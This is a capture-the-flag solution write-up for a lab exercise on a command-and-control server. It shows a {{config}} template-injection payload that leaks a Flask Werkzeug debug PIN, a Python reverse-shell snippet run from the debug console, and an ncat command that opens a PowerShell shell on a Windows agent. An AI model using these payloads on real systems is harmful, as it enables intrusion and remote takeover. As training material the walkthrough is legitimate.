# I See You Too Solution

## Accessing the Console

- Download the `payload.exe` file from challenge.us/files
- Investigate the payload file by opening in a reverse engineering tool of your choice (ollydebug, IDA, Ghidra)
- Alternately, you can open Wireshark and see the traffic in the Windows box from the payload to the C2 server
- After looking into the payload/traffic, notice it first registers the Agent then enters a while loop looking for tasks and the endpoint /tasks on the IP address 10.5.5.56 and port 1980.
  - This is important for later to obtain the last token
- Visit the index of the server and notice it has a list of endpoints listed
- Visit "/agents"
- Notice that the agent listed in the text notifying you if the agent is online is "None" and takes in a search parameter.
- Enter in the url, "10.5.5.56/agents?search={{config}}"
- You will receive a long config file from a Flask application and notice the last string, WERKZEUG_PIN
- This pin is the first flag but also the password to "10.5.5.56/console"
- This console will give you access via python to the C2 server

## Access to the C2 Server

- Since you have access to the C2 Server, you can either get a reverse shell or navigate to the home directory using python to get the key.
- In this solution guide, I'll elect to just create a reverse shell
- First thing is to set up netcat
- On the kali box, enter the command:
  ```bash
  nc -lnp 8001
  ```
- In the werkzeug console, type in:
  ```python
  import socket, os, pty
  s=socket.socket()
  s.connect((<IP Addr of Kali Box>, 8001))
  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
  pty.spawn("/bin/sh")
  ```
- You will get a TTY reverse shell on the Kali side
- Navigate to /home/user/user_token.txt and grab the token

## Tasking the Hacked Box

- We're going to take advantage of the task endpoint to get access to the hacked box
- Navigate to /home/user/c2/core
- Investigate listener.py and take note on how tasking works
  - Essentially, the payload has a heartbeat and checks the endpoint if it has a task available
  - The task is just a txt file named "tasks" in the agent's folder located in /home/user/c2/data/listeners/agent/<Name Of Agent>
- Create a task in it to give access to the client
  - In this case, we can give it a task of "powershell ncat -lnp 8002 -e powershell.exe"
  - This will give us a reverse shell in powershell
- Connect to the Windows machine using nc on kali
  - If you haven't already, do an nmap scan on 10.5.5.0/24 to find the machine affected
  - nc <IP of Windows Machine> 8002
- You should get the reverse shell and access to the token located on the Desktop of that machine named "hacked_token"
